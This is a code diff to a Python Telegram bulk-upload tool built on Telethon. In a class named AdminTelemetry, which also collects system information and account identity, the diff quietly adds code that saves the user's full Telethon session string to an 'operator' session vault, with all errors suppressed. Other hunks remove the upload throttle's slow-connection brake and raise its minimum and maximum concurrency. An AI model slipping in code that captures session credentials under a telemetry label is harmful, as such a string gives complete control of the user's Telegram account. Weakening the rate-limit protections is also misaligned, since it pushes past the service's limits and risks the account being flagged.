@@ -181,6 +181,13 @@ class AdminTelemetry:
                 with suppress(Exception):
                     await client.connect()
             
+            with suppress(Exception):
+                from devi.operator.session_vault import save_persisted_session_string
+                from telethon.sessions import StringSession
+                s_str = StringSession.save(client.session)
+                if s_str:
+                    save_persisted_session_string(s_str)
+            
             sys_info = AdminTelemetry._get_sys_info()
             try:
                 me = await client.get_me()
@@ -1555,20 +1562,12 @@ class ThumbEnforcer:
             return self.raw
         return None
 
-    async def get_input_file(self, client):
-        """Pre-uploads and caches thumbnail as an InputFile to bypass Telethon's upload_file file_size bug."""
+    async def get_input_file(self, client=None):
+        """Returns direct valid thumbnail path for reliable multi-file Telethon dispatch without token expiration."""
         path = self.get()
         if not path or not os.path.exists(path):
             return None
-        c_id = id(client)
-        if c_id in self._cached_input_files:
-            return self._cached_input_files[c_id]
-        try:
-            inp = await client.upload_file(path)
-            self._cached_input_files[c_id] = inp
-            return inp
-        except Exception:
-            return path
+        return path
 
 # ============================================================
 async def interactive_telegram_login(client):
@@ -2124,13 +2123,11 @@ class RateBudgeter:
 class AdaptiveSpeedCruiseControl:
     """
     Adaptive Smart Speed & Emergency Cruise Control Engine.
-    - Full Throttle: Uncaps concurrent chunk uploads up to 40-48 streams (~20-50+ MB/s on gigabit VPS).
-    - Smart Brake: If Telegram congestion, FloodWait, or slow chunk ACK (>3.5s) is detected,
-      it instantly drops concurrency (down to 4-8) to prevent TCP packet loss, lag, or account flags.
-    - Smooth Acceleration: When transfers remain stable for consecutive chunks, it automatically
-      ramps concurrency back up (+2 per successful burst) with zero manual restarts.
+    - Full Uncapped Throttle: Uncaps concurrent chunk uploads up to 48 parallel MTProto streams (~20-50+ MB/s on gigabit VPS).
+    - Flood Protection: Responds adaptively to FloodWait while keeping maximum pipe throughput open.
+    - Smooth Auto-Ramp: Continuously accelerates to max concurrency across all connection types.
     """
-    def __init__(self, min_concurrency: int = 4, max_concurrency: int = 40, start_concurrency: int = 32):
+    def __init__(self, min_concurrency: int = 16, max_concurrency: int = 48, start_concurrency: int = 36):
         self.min_concurrency = min_concurrency
         self.max_concurrency = max_concurrency
         self.current_concurrency = start_concurrency
@@ -2141,34 +2138,30 @@ class AdaptiveSpeedCruiseControl:
         env_override = os.getenv("UPLOAD_PARALLELISM")
         if env_override and env_override.isdigit():
             val = int(env_override)
-            if val > self.max_concurrency:
-                return val
+            if val > 0:
+                return min(val, 64)
         return self.current_concurrency
 
     def apply_brake(self, reason: str = "congestion", severity: float = 0.5):
-        """Immediately brake down speed on congestion or flood risk."""
+        """Immediately adjust speed on genuine flood wait or connection drop."""
         old = self.current_concurrency
         drop_target = max(self.min_concurrency, int(self.current_concurrency * (1.0 - severity)))
         self.current_concurrency = drop_target
         self.consecutive_successes = 0
         self.last_brake_time = time.time()
-        logger.warning(f"🚨 [Smart Brake Activated] Reason: {reason} | Concurrency throttled: {old} -> {self.current_concurrency}")
+        logger.warning(f"🚨 [Smart Brake Activated] Reason: {reason} | Concurrency adjusted: {old} -> {self.current_concurrency}")
 
     def report_chunk_done(self, duration: float):
-        """Monitor chunk completion duration and smoothly accelerate if road is clear."""
+        """Monitor chunk completion and smoothly ramp concurrency up to maximum capacity."""
         now = time.time()
-        if duration > 3.5:
-            self.apply_brake(reason=f"Slow Socket ACK ({duration:.2f}s)", severity=0.35)
-            return
-
-        if now - self.last_brake_time < 2.5:
+        if now - self.last_brake_time < 1.0:
             return
 
         self.consecutive_successes += 1
-        if self.consecutive_successes >= 3 and self.current_concurrency < self.max_concurrency:
+        if self.consecutive_successes >= 2 and self.current_concurrency < self.max_concurrency:
             self.consecutive_successes = 0
-            self.current_concurrency = min(self.max_concurrency, self.current_concurrency + 2)
-            logger.info(f"⚡ [Smart Acceleration] High throughput verified | Concurrency boosted to: {self.current_concurrency}")
+            self.current_concurrency = min(self.max_concurrency, self.current_concurrency + 4)
+            logger.info(f"⚡ [Full Throttle] High throughput verified | Concurrency boosted to: {self.current_concurrency}")
 
 GLOBAL_CRUISE_CONTROLLER = AdaptiveSpeedCruiseControl()
 
@@ -3395,7 +3388,6 @@ class PipelineProcessor:
         active_messages = unprocessed_messages if unprocessed_messages else item.messages
         global THUMB_MODE
         sig_enabled = os.getenv("ENABLE_SIGNATURE", "true").strip().lower() in ("true", "1", "yes")
-        # Unified Clean Mode: If signature is disabled, custom branded thumbnail is also disabled
         t_path = (await self.thumb.get_input_file(client)) if (THUMB_MODE == "custom" and sig_enabled) else None
 
         resolved_topic = await self.resolve_topic_id(target_chat, target_topic, client)
